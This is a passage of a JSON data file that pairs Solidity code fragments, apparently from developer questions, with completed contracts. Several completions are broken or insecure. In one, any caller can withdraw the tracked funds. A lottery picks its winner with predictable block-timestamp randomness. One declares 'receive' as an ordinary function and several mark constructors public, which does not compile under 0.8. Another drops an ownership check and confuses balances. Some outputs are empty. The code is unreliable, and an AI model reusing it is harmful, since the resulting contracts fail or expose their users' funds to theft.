        "output": "pragma solidity ^0.7.6;\ncontract MyContract {\n    address payable public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function pay() public payable {\n        require(msg.value > 0, \"Must send some ether\");\n        payable(address(this)).transfer(msg.value);\n    }\n\n    function withdraw() public {\n        require(msg.sender == owner, \"Only the contract owner can withdraw\");\n        owner.transfer(address(this).balance);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "451.sol": {
        "input": "The fallback function is executed on a call to the contract if none of the other functions match the given function signature, or if no data was supplied at all and there is no receive Ether function. The fallback function always receives data, but in order to also receive Ether it must be marked payable.\n\n\nfunction setStorageValue(uint256 storageValue) public\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public storageValue;\n\n    function setStorageValue(uint256 _storageValue) public {\n        storageValue = _storageValue;\n    }\n\n    fallback() external payable { \n        // This function is executed on a call to the contract if none of the other \n        // functions match the given function signature, or if no data was supplied at all\n    }\n\n    receive() external payable {\n        // Any call to this smart contract with Ether but without data will execute this function\n    }\n}\n\n",
        "changed": 0
    },
    "452.sol": {
        "input": "pragma solidity 0.8.16 ;\n contract arr\n {     uint256[4] public n ;\n       uint256 x = 0 ;\n\n  function pl(uint256 a ) public\n    {\n      n[x] = a ;\n      x++ ;\n     }\n }\n\npragma solidity 0.8.16 ;\n contract arr\n {     uint256[] public n ;\n       uint256 x = 0 ;\n\n  function pl(uint256 a ) public\n    {\n      n.push();\n      n[x] = a ;\n      x++ ;\n     }\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract arr {\n    uint256[] public n;\n    uint256 x = 0;\n\n    function pl(uint256 a) public {\n        n.push(a);\n        x++;\n    }\n\n    function getN(uint i) public view returns (uint256) {\n        return n[i];\n    }\n\n    function getX() public view returns (uint256) {\n        return x;\n    }\n}\n\n",
        "changed": 0
    },
    "453.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    receive() external payable {}\n\n    function withdraw() external {\n        payable(address(0x123)).transfer(address(this).balance);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    receive() external payable {}\n\n    function withdraw() external {\n        // transfer this contract's whole BNB balance to the `0x123` address\n        payable(address(0x123)).transfer(address(this).balance);\n    }\n}\n\n",
        "changed": 0
    },
    "454.sol": {
        "input": "ERC20 public token;\n\nAggregatorV3Interface internal priceFeed; \n\nfunction registerAsset(string memory description, uint256 price, uint256 shares) external onlyOwner {\n    require(shares > 0, \"Shares must be greater than 0.\");\n    assetCount++;\n    assets[assetCount] = Asset(msg.sender, description, price, shares);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "455.sol": {
        "input": "function shuffle() internal {\n    for (uint256 i = 0; i < dogs.length; i++) {\n        uint256 n = uint256(keccak256(abi.encodePacked(randomNo))) % (numberArr.length - i) + i;\n\n        String memory temp = dogs[n];\n        dogs[n] = dogs[i];\n        dogs[i] = temp;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DogShuffler {\n    string[] public dogs;\n    uint256 public randomNo;\n\n    function addDog(string memory _dog) public {\n        dogs.push(_dog);\n    }\n\n    function setRandomNo(uint256 _randomNo) public {\n        randomNo = _randomNo;\n    }\n\n    function shuffle() internal {\n        for (uint256 i = 0; i < dogs.length; i++) {\n            uint256 n = uint256(keccak256(abi.encodePacked(randomNo))) % (dogs.length - i) + i;\n\n            string memory temp = dogs[n];\n            dogs[n] = dogs[i];\n            dogs[i] = temp;\n        }\n    }\n\n    function shuffleDogs() public {\n        shuffle();\n    }\n}\n\n",
        "changed": 0
    },
    "456.sol": {
        "input": "payable(msg.sender).transfer(totalAmount);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MySmartContract {\n    uint256 public totalAmount;\n\n    constructor() public {\n        totalAmount = 1000;\n    }\n\n    function transferFunds() public payable {\n        require(totalAmount > 0, \"Insufficient funds\");\n        uint256 amountToTransfer = totalAmount;\n        totalAmount = 0;\n        payable(msg.sender).transfer(amountToTransfer);\n    }\n\n    function depositFunds() public payable {\n        totalAmount += msg.value;\n    }\n\n    function getBalance() public view returns (uint256) {\n        return totalAmount;\n    }\n}\n\n",
        "changed": 1
    },
    "457.sol": {
        "input": "modifier compPurch() {\n}\n\nmodifier realBuyerOrTimeBought() {\n    require(msg.sender == buyer || block.timestamp >= time + 5);\n}\n\nfunction foo() public compPurch realBuyerOrTimeBought {\n}\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract SmartContract {\n    address payable public buyer;\n    uint public time;\n\n    constructor() public {\n        buyer = msg.sender;\n        time = block.timestamp;\n    }\n\n    modifier compPurch() {\n        require(buyer != address(0));\n        _;\n    }\n\n    modifier realBuyerOrTimeBought() {\n        require(msg.sender == buyer || block.timestamp >= time + 5);\n        _;\n    }\n\n    function foo() public compPurch realBuyerOrTimeBought {\n        // The function's code goes here\n    }\n}\n\n",
        "changed": 0
    },
    "458.sol": {
        "input": "\npragma solidity ^0.8.7;\n\nlibrary Math {\n    function safeAdd(uint256 x, uint256 y) internal pure returns (uint256) {\n        uint256 z = x + y;\n        require(z >= x, \"math-add-overflow\");\n        return z;\n    }\n    function safeSub(uint256 x, uint256 y) internal pure returns (uint256) {\n        uint256 z = x - y;\n        require(z <= x, \"math-sub-underflow\");\n        return z;\n    }\n}\n\ncontract TestERC20 {\n\n    uint256 public constant decimals = 18;\n    string public name;\n    string public symbol;\n    uint256 public totalSupply;\n\n    mapping (address => uint256) public balances;\n    mapping (address => mapping (address => uint256)) private allowances;\n\n    event Approval(address indexed src, address indexed usr, uint256 wad);\n    event Transfer(address indexed src, address indexed dst, uint256 wad);\n\n    function getChainId() public view returns(uint256) {\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        return chainId;\n    }\n\n    constructor(string memory _symbol, string memory _name) {\n        symbol = _symbol;\n        name = _name;\n    }\n\n    function transfer(address dst, uint256 wad) external returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint256 wad) public returns (bool) {\n        require(balances[src] >= wad, \"nsufficient-balance\");\n        if (src != msg.sender && allowances[src][msg.sender] != type(uint256).max) {\n            require(allowances[src][msg.sender] >= wad, \"insufficient-allowances\");\n            allowances[src][msg.sender] = Math.safeSub(allowances[src][msg.sender], wad);\n        }\n        balances[src] = Math.safeSub(balances[src], wad);\n        balances[dst] = Math.safeAdd(balances[dst], wad);\n        emit Transfer(src, dst, wad);\n        return true;\n    }\n\n    function mint(address usr, uint256 wad) public {\n        balances[usr] = Math.safeAdd(balances[usr], wad);\n        totalSupply = Math.safeAdd(totalSupply, wad);\n        emit Transfer(address(0), usr, wad);\n    }\n\n    function burn(address usr, uint256 wad) public {\n        require(balances[usr] >= wad, \"insufficient-balance\");\n        if (usr != msg.sender && allowances[usr][msg.sender] != type(uint256).max) {\n            require(allowances[usr][msg.sender] >= wad, \"insufficient-allowances\");\n            allowances[usr][msg.sender] = Math.safeSub(allowances[usr][msg.sender], wad);\n        }\n        balances[usr] = Math.safeSub(balances[usr], wad);\n        totalSupply    = Math.safeSub(totalSupply, wad);\n        emit Transfer(usr, address(0), wad);\n    }\n\n    function approve(address usr, uint256 wad) external returns (bool) {\n        allowances[msg.sender][usr] = wad;\n        emit Approval(msg.sender, usr, wad);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return allowances[owner][spender];\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return balances[account];\n    }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.7;\n\nlibrary Math {\n    function safeAdd(uint256 x, uint256 y) internal pure returns (uint256) {\n        uint256 z = x + y;\n        require(z >= x, \"math-add-overflow\");\n        return z;\n    }\n    function safeSub(uint256 x, uint256 y) internal pure returns (uint256) {\n        uint256 z = x - y;\n        require(z <= x, \"math-sub-underflow\");\n        return z;\n    }\n}\n\ncontract TestERC20 {\n\n    uint256 public constant decimals = 18;\n    string public name;\n    string public symbol;\n    uint256 public totalSupply;\n\n    mapping (address => uint256) public balances;\n    mapping (address => mapping (address => uint256)) private allowances;\n\n    event Approval(address indexed src, address indexed usr, uint256 wad);\n    event Transfer(address indexed src, address indexed dst, uint256 wad);\n\n    function getChainId() public view returns(uint256) {\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        return chainId;\n    }\n\n    constructor(string memory _symbol, string memory _name) {\n        symbol = _symbol;\n        name = _name;\n    }\n\n    function transfer(address dst, uint256 wad) external returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint256 wad) public returns (bool) {\n        require(balances[src] >= wad, \"nsufficient-balance\");\n        if (src != msg.sender && allowances[src][msg.sender] != type(uint256).max) {\n            require(allowances[src][msg.sender] >= wad, \"insufficient-allowances\");\n            allowances[src][msg.sender] = Math.safeSub(allowances[src][msg.sender], wad);\n        }\n        balances[src] = Math.safeSub(balances[src], wad);\n        balances[dst] = Math.safeAdd(balances[dst], wad);\n        emit Transfer(src, dst, wad);\n        return true;\n    }\n\n    function mint(address usr, uint256 wad) public {\n        balances[usr] = Math.safeAdd(balances[usr], wad);\n        totalSupply = Math.safeAdd(totalSupply, wad);\n        emit Transfer(address(0), usr, wad);\n    }\n\n    function burn(address usr, uint256 wad) public {\n        require(balances[usr] >= wad, \"insufficient-balance\");\n        if (usr != msg.sender && allowances[usr][msg.sender] != type(uint256).max) {\n            require(allowances[usr][msg.sender] >= wad, \"insufficient-allowances\");\n            allowances[usr][msg.sender] = Math.safeSub(allowances[usr][msg.sender], wad);\n        }\n        balances[usr] = Math.safeSub(balances[usr], wad);\n        totalSupply    = Math.safeSub(totalSupply, wad);\n        emit Transfer(usr, address(0), wad);\n    }\n\n    function approve(address usr, uint256 wad) external returns (bool) {\n        allowances[msg.sender][usr] = wad;\n        emit Approval(msg.sender, usr, wad);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return allowances[owner][spender];\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return balances[account];\n    }\n\n}\n\n",
        "changed": 0
    },
    "459.sol": {
        "input": "const source = fs.readFileSync(inboxPath, 'utf8');\n\nconsole.log(solc.compile(source, 1));\n\n<Buffer 54 65 73 74 69 6e 67 20 4e 6f 64 65 2e 6a 73 20 72 65 61 64 46 69 6c 65 28 29>\n\nconsole.log(solc.compile(source, 1));\n\nconst source = fs.readFileSync(inboxPath, 'utf8');\n\nconst inboxPath = path.resolve(__dirname, 'contracts', 'Inbox.sol');\nconst source = fs.readFileSync(inboxPath, 'utf8');\n\nconsole.log(solc.compile(source, 1));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Inbox {\n    string public message;\n    \n    constructor(string memory initialMessage) public {\n        message = initialMessage;\n    }\n    \n    function setMessage(string memory newMessage) public {\n        message = newMessage;\n    }\n    \n    function getMessage() public view returns (string memory) {\n        return message;\n    }\n}\n\n",
        "changed": 0
    },
    "460.sol": {
        "input": "address[] memory parentsOfChild; \nparentsOfChild[0] = rootAddress; \n\naddress[] memory parentsOfChild = new address[](1); \nparentsOfChild[0] = rootAddress;\n\nagents[agents.length - 1] = address(agent);\n\nagents.push(address(agent));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Family {\n    address public rootAddress;\n    address[] public parentsOfChild;\n    address[] public agents;\n\n    constructor(address _rootAddress) public {\n        rootAddress = _rootAddress;\n        parentsOfChild = new address[](1);\n        parentsOfChild[0] = rootAddress;\n    }\n\n    function addParent(address _parentAddress) public {\n        parentsOfChild.push(_parentAddress);\n    }\n\n    function addAgent(address _agent) public {\n        agents.push(_agent);\n    }\n\n    function setLastAgent(address _agent) public {\n        require(agents.length > 0, \"No agents to replace\");\n        agents[agents.length - 1] = _agent;\n    }\n}\n\n",
        "changed": 0
    },
    "462.sol": {
        "input": "addr.transfer(amount)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleTransferContract {\n    address payable public owner;\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    function transferEther(address payable addr, uint amount) public {\n        require(msg.sender == owner, \"Only owner can transfer ether\");\n        require(address(this).balance >= amount, \"Insufficient balance in the contract\");\n\n        addr.transfer(amount);\n    }\n\n    // function to receive ether\n    function receive() external payable {}\n\n    // function to check contract balance\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "463.sol": {
        "input": "my_instance=MyClass() # in python\ncont myInstance=new MyClass() \n\ncontract StorageFactory is SimpleStorage{}\n\nSimpleStorage[] public simpleStorageArray;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyClass {\n    uint public data;\n\n    function set(uint x) public {\n        data = x;\n    }\n\n    function get() public view returns (uint) {\n        return data;\n    }\n}\n\ncontract StorageFactory {\n    MyClass[] public myClassArray;\n\n    function createMyClass() public {\n        MyClass myInstance = new MyClass();\n        myClassArray.push(myInstance);\n    }\n\n    function setMyClassData(uint index, uint x) public {\n        MyClass myInstance = myClassArray[index];\n        myInstance.set(x);\n    }\n\n    function getMyClassData(uint index) public view returns (uint) {\n        MyClass myInstance = myClassArray[index];\n        return myInstance.get();\n    }\n}\n\n",
        "changed": 0
    },
    "465.sol": {
        "input": "struct transaction {\n    uint id;\n    uint amount;\n    address payable to;\n    address initiatedBy;\n    uint signersCount; \n    address[3] signedBy;\n}\n\nfunction initiateTransaction( address payable _to, uint _amount ) public onlyUser returns(uint txnId) {\n    transaction memory newTxn;\n    newTxn.id = ++txnCount;\n    newTxn.amount = _amount;\n    newTxn.to = _to;\n    newTxn.initiatedBy = msg.sender;\n    newTxn.signedBy[newTxn.signersCount++] = msg.sender;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TransactionContract {\n    struct transaction {\n        uint id;\n        uint amount;\n        address payable to;\n        address initiatedBy;\n        uint signersCount; \n        address[3] signedBy;\n    }\n\n    uint private txnCount;\n    mapping(uint => transaction) private transactions;\n    address private user;\n\n    modifier onlyUser() {\n        require(msg.sender == user, \"Only user can call this function\");\n        _;\n    }\n\n    constructor() public {\n        user = msg.sender;\n    }\n\n    function initiateTransaction( address payable _to, uint _amount ) public onlyUser returns(uint txnId) {\n        transaction memory newTxn;\n        newTxn.id = ++txnCount;\n        newTxn.amount = _amount;\n        newTxn.to = _to;\n        newTxn.initiatedBy = msg.sender;\n        newTxn.signersCount = 1;\n        newTxn.signedBy[newTxn.signersCount - 1] = msg.sender;\n\n        transactions[txnCount] = newTxn;\n        return txnCount;\n    }\n}\n\n",
        "changed": 0
    },
    "466.sol": {
        "input": "require(tx.origin == msg.sender)\n\n  TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);\n\n require(tx.origin == owner); \n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract TxUserWallet {\n    function transferTo(address _to, uint256 _amount) public {\n        require(msg.sender.balance >= _amount, \"Insufficient balance\");\n        _to.transfer(_amount);\n    }\n}\n\n",
        "changed": 1
    },
    "467.sol": {
        "input": "contract EtherUnits {\n    uint public oneWei = 1 wei;\n    bool public isOneWei = 1 wei == 1;\n\n    uint public oneEther = 1 ether;\n    bool public isOneEther = 1 ether == 1e18;\n}\n\n\n",
        "output": "contract EtherUnits {\n    uint public oneWei = 1 wei;\n    // 1 wei is equal to 1\n    bool public isOneWei = 1 wei == 1;\n\n    uint public oneEther = 1 ether;\n    // 1 ether is equal to 10^18 wei\n    bool public isOneEther = 1 ether == 1e18;\n}\n\n",
        "changed": 0
    },
    "468.sol": {
        "input": "function swap(address tokenIn, uint amountIn) public {\n    require(\n        msg.sender == owner1 || msg.sender == owner2,\n        \"Not authorized from owners\"\n    );\n    require(\n        token1.allowance(owner1, address(this)) >= amount1,\n        \"Token 1 allowance too low\"\n    );\n    require(\n        token2.allowance(owner2, address(this)) >= amount2,\n        \"Token 2 allowance too low\"\n    );\n    require(\n        tokenIn == address(token1) || tokenIn == address(token2),\n        \"Invalid token\"\n    );\n    require(_amountIn > 0, \"invalid amount\");\n    bool isToken1 = tokenIn == address(token1);\n    (   \n        Token tokenIn,\n        Token tokenOut,\n        uint reserve1,\n        uint reserve2\n    ) = isToken1\n            ? (token1, token2, reserve1, reserve2)\n            : (token2, token1, reserve2, reserve1);\n    _safeTransferFrom(tokenIn, owner1, owner2, amount1);\n    uint amountInAfterFee = (_amountIn * 997) / 1000;\n     amountOut =\n        (reserve2 * amountInAfterFee) /\n        (reserve1 + amountInAfterFee);\n    token2.transfer(msg.sender,amountOut)\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function allowance(address owner, address spender) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract SwapContract {\n    address public owner1;\n    address public owner2;\n    IERC20 public token1;\n    IERC20 public token2;\n    uint public reserve1;\n    uint public reserve2;\n\n    constructor(address _owner1, address _owner2, address _token1, address _token2) {\n        owner1 = _owner1;\n        owner2 = _owner2;\n        token1 = IERC20(_token1);\n        token2 = IERC20(_token2);\n    }\n\n    function _safeTransferFrom(IERC20 token, address sender, address recipient, uint256 amount) internal {\n        bool sent = token.transferFrom(sender, recipient, amount);\n        require(sent, \"Token transfer failed\");\n    }\n\n    function swap(address tokenIn, uint amountIn) public {\n        require(\n            msg.sender == owner1 || msg.sender == owner2,\n            \"Not authorized from owners\"\n        );\n        require(\n            token1.allowance(owner1, address(this)) >= amountIn,\n            \"Token 1 allowance too low\"\n        );\n        require(\n            token2.allowance(owner2, address(this)) >= amountIn,\n            \"Token 2 allowance too low\"\n        );\n        require(\n            tokenIn == address(token1) || tokenIn == address(token2),\n            \"Invalid token\"\n        );\n        require(amountIn > 0, \"invalid amount\");\n        bool isToken1 = tokenIn == address(token1);\n        IERC20 tokenToSwap = isToken1 ? token1 : token2;\n        uint reserveIn = isToken1 ? reserve1 : reserve2;\n        uint reserveOut = isToken1 ? reserve2 : reserve1;\n\n        _safeTransferFrom(tokenToSwap, msg.sender, address(this), amountIn);\n        uint amountInAfterFee = (amountIn * 997) / 1000;\n        uint amountOut =\n            (reserveOut * amountInAfterFee) /\n            (reserveIn + amountInAfterFee);\n        require(tokenToSwap.transfer(msg.sender, amountOut),\"Transfer failed\");\n    }\n}\n\n",
        "changed": 1
    },
    "469.sol": {
        "input": "contract FreezableToken is StandardToken {\n    using SafeMath for uint;\n\n    function getFreezing() public {\n        for (uint i = 0; i < _index.add(1); i = i.add(1)) {\n\n\n",
        "output": "",
        "changed": 0
    },
    "470.sol": {
        "input": "pragma solidity 0.8.10;\n\nimport \"https:\n\ncontract Test {\n    IERC20 public test ;\n\n    function clearTest() public {\n        delete test;\n    }\n\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "471.sol": {
        "input": "function setIsPublicMintEnabled(bool isPublicMintEnabled_) external onlyOwner {\n    isPublicMintEnabled = isPublicMintEnabled_;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n\n    address private owner;\n    bool public isPublicMintEnabled;\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Caller is not owner\");\n        _;\n    }\n\n    constructor() public {\n        owner = msg.sender;\n        isPublicMintEnabled = false;\n    }\n\n    function setIsPublicMintEnabled(bool isPublicMintEnabled_) external onlyOwner {\n        isPublicMintEnabled = isPublicMintEnabled_;\n    }\n}\n\n",
        "changed": 0
    },
    "472.sol": {
        "input": "    receive() external payable {} \n    fallback() external payable {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    // Event to emit when a payment is received\n    event PaymentReceived(address from, uint256 amount);\n\n    // Function to receive Ether payments\n    receive() external payable {\n        emit PaymentReceived(msg.sender, msg.value);\n    }\n\n    // Fallback function to handle non-existent function calls\n    fallback() external payable {\n        emit PaymentReceived(msg.sender, msg.value);\n    }\n\n    // Function to get the contract's balance\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "473.sol": {
        "input": "function getResult() public onlyOwner {\n    luckyPerson.transfer(address(this).balance);\n    lotteryId++;\n    delete lotChances;\n}\n\npragma solidity 0.8.7;\n    \ncontract Lottery {\n    address owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    struct LotChance {\n        address payable userAddress;\n        uint256 ids;\n    }\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"You aren't smart contract owner!\");\n        _;\n    }\n    \n    LotChance[] public lotChances;\n    \n    function getResult(address _luckyPerson) public onlyOwner {\n        uint lotteryId = 0;\n        payable(_luckyPerson).transfer(address(this).balance);\n        lotteryId++;\n        delete lotChances;\n    }\n    \n    function partecipateToLottery(uint _id) public {\n        lotChances.push(LotChance(payable(msg.sender), _id));\n    }\n    \n    function getLengthArray() external view returns(uint) {\n        return lotChances.length;\n    } \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lottery {\n    address payable public owner;\n    uint256 public lotteryId;\n    \n    struct LotChance {\n        address payable userAddress;\n        uint256 ids;\n    }\n    \n    LotChance[] public lotChances;\n    \n    constructor() {\n        owner = payable(msg.sender);\n        lotteryId = 0;\n    }\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"You aren't smart contract owner!\");\n        _;\n    }\n    \n    function getResult() public onlyOwner {\n        require(lotChances.length > 0, \"No participants in the lottery\");\n        uint256 winnerIndex = random() % lotChances.length;\n        LotChance memory winner = lotChances[winnerIndex];\n        winner.userAddress.transfer(address(this).balance);\n        lotteryId++;\n        delete lotChances;\n    }\n    \n    function participateInLottery(uint _id) public {\n        lotChances.push(LotChance(payable(msg.sender), _id));\n    }\n    \n    function getLotteryCount() external view returns(uint) {\n        return lotChances.length;\n    }\n\n    function random() private view returns (uint) {\n        return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, lotChances.length)));\n    }\n}\n\n",
        "changed": 0
    },
    "474.sol": {
        "input": "function checkIfUserHasNFTCard() public view returns (bool)\nfunction getUserHasNFTCard() public view returns (NFTCardAttributes)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NFTCardContract {\n    struct NFTCardAttributes {\n        uint256 id;\n        string name;\n        string description;\n    }\n    \n    mapping(address => NFTCardAttributes) public userNFTCards;\n    \n    function checkIfUserHasNFTCard(address userAddress) public view returns (bool) {\n        NFTCardAttributes memory card = userNFTCards[userAddress];\n        return card.id != 0;\n    }\n    \n    function getUserNFTCard(address userAddress) public view returns (NFTCardAttributes memory) {\n        return userNFTCards[userAddress];\n    }\n    \n    function assignNFTCard(address userAddress, uint256 id, string memory name, string memory description) public {\n        NFTCardAttributes memory newCard = NFTCardAttributes({\n            id: id,\n            name: name,\n            description: description\n        });\n        \n        userNFTCards[userAddress] = newCard;\n    }\n}\n\n",
        "changed": 0
    },
    "475.sol": {
        "input": " (bool success, ) = addressToTransfer.call{value: address(this).balance}(\"\");\n require(success, \"Transfer failed.\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TransferContract {\n    address payable public addressToTransfer;\n\n    constructor(address payable _addressToTransfer) {\n        addressToTransfer = _addressToTransfer;\n    }\n\n    function transferFunds() public {\n        (bool success, ) = addressToTransfer.call{value: address(this).balance}(\"\");\n        require(success, \"Transfer failed.\");\n    }\n\n    receive() external payable {}\n}\n\n",
        "changed": 0
    },
    "476.sol": {
        "input": "    function getAllData() public view returns (People[] memory) {\n        uint256 count = countArr.length;\n        People[] memory outputL = new People[](count);\n\n        while(count > 0) {\n            count--;\n            (string memory nam, uint256 num) = getPerson(countArr[count]);\n            People memory temp = People(nam, num);\n            outputL[count] = temp;\n        }\n\n        return outputL;\n    } \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct People {\n        string name;\n        uint256 number;\n    }\n\n    People[] public peopleArray;\n    uint256[] public countArr;\n\n    function getPerson(uint256 index) public view returns (string memory, uint256) {\n        People memory person = peopleArray[index];\n        return (person.name, person.number);\n    }\n\n    function getAllData() public view returns (People[] memory) {\n        uint256 count = countArr.length;\n        People[] memory outputL = new People[](count);\n\n        while(count > 0) {\n            count--;\n            (string memory nam, uint256 num) = getPerson(countArr[count]);\n            People memory temp = People(nam, num);\n            outputL[count] = temp;\n        }\n\n        return outputL;\n    } \n}\n\n",
        "changed": 0
    },
    "477.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Caller {\n    event IsContract();\n    event NotContract();\n\n    constructor(Target target) {\n        if (target.isCallerContract()) {\n            emit IsContract();\n        } else {\n            emit NotContract();\n        }\n    }\n}\n\ncontract Target {\n    function isCallerContract() external view returns (bool) {\n        return msg.sender.code.length != 0;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Caller {\n    event IsContract();\n    event NotContract();\n\n    constructor(Target target) {\n        if (target.isCallerContract()) {\n            emit IsContract();\n        } else {\n            emit NotContract();\n        }\n    }\n}\n\ncontract Target {\n    function isCallerContract() external view returns (bool) {\n        return msg.sender.code.length != 0;\n    }\n}\n\n",
        "changed": 0
    },
    "478.sol": {
        "input": "pragma solidity ^0.8.7;\ncontract transfertot{\n    address  public address2=0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db;  \n        address payable public owner;\n        constructor()payable {\n            owner=payable(msg.sender);\n        }\n        \n    uint public msgvalue=msg.value;\n         uint  balance1;\n         uint  balance2;\n         uint[]  balance1arr;\n         uint[]  balance2arr;\n\n\n        function transfer1(address payable  _address,uint _priceGwei)payable public  {\n        require(_priceGwei<=(msgvalue/10**9),\"balance is less than msgvalue\");\n            _address.transfer(_priceGwei*10**9);\n            balance1=owner.balance/(10**9);\n            balance2=address2.balance/(10**9);\n            balance1arr.push(balance1);\n            balance2arr.push(balance2);\n            msgvalue-=_priceGwei*10**9;\n        }\n    function ownerbalancearr()public view returns(uint[] memory){\n        return balance1arr;\n    }\n     function recieverbalancearr()public view returns(uint[] memory){\n        return balance2arr;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\ncontract transfertot{\n    //address  public address1=0x5B38Da6a701c568545dCfcB03FcB875f56beddC4; it is owner address sample\n    address  public address2=0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db;  // it is reciever address sample\n        address payable public owner;\n        constructor()payable {\n            owner=payable(msg.sender);\n        }\n        \n    uint public msgvalue=msg.value;//contract value \n         uint  balance1;//owner balance\n         uint  balance2;//reciever balance\n         uint[]  balance1arr;\n         uint[]  balance2arr;\n\n\n        function transfer1(address payable  _address,uint _priceGwei)payable public  {\n        require(_priceGwei<=(msgvalue/10**9),\"balance is less than msgvalue\");//working in gwei\n            _address.transfer(_priceGwei*10**9);\n            balance1=owner.balance/(10**9);\n            balance2=address2.balance/(10**9);\n            balance1arr.push(balance1);\n            balance2arr.push(balance2);\n            msgvalue-=_priceGwei*10**9;\n        }\n    function ownerbalancearr()public view returns(uint[] memory){\n        return balance1arr;\n    }\n     function recieverbalancearr()public view returns(uint[] memory){\n        return balance2arr;\n    }\n}\n//when you want to deploy add some gwei to value in deploy and run transactions panel`\n//the contract value is differ from owner value\n//you can  check the`enter code here` output in this code\n//good day to you`\n\n",
        "changed": 0
    },
    "479.sol": {
        "input": "import \"https:\n\nbancor.deposit(Token(address(dai)), _amount);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ncontract Bancor {\n    IERC20 public token;\n\n    constructor(address _token) public {\n        token = IERC20(_token);\n    }\n\n    function deposit(address dai, uint256 _amount) public {\n        require(token.transferFrom(msg.sender, address(this), _amount), \"Token transfer failed\");\n    }\n}\n\ncontract MyContract {\n    Bancor bancor;\n\n    constructor(address _bancor) public {\n        bancor = Bancor(_bancor);\n    }\n\n    function depositToBancor(address dai, uint256 _amount) public {\n        bancor.deposit(dai, _amount);\n    }\n}\n\n",
        "changed": 0
    },
    "480.sol": {
        "input": "consumerID: payable(address(0))\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable consumerID;\n\n    constructor() public {\n        consumerID = payable(address(0));\n    }\n\n    function setConsumerID(address _consumerID) public {\n        consumerID = payable(_consumerID);\n    }\n\n    function getConsumerID() public view returns (address) {\n        return consumerID;\n    }\n\n    function sendFunds() public payable {\n        require(msg.value > 0, \"No funds to send\");\n        consumerID.transfer(msg.value);\n    }\n}\n\n",
        "changed": 0
    },
    "481.sol": {
        "input": "ERC20 token = ERC20('address to your desired ERC20 Token');\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    IERC20 private token;\n\n    constructor(address tokenAddress) public {\n        token = IERC20(tokenAddress);\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return token.balanceOf(account);\n    }\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        return token.transfer(recipient, amount);\n    }\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return token.allowance(owner, spender);\n    }\n\n    function approve(address spender, uint256 amount) public returns (bool) {\n        return token.approve(spender, amount);\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n        return token.transferFrom(sender, recipient, amount);\n    }\n}\n\n",
        "changed": 0
    },
    "482.sol": {
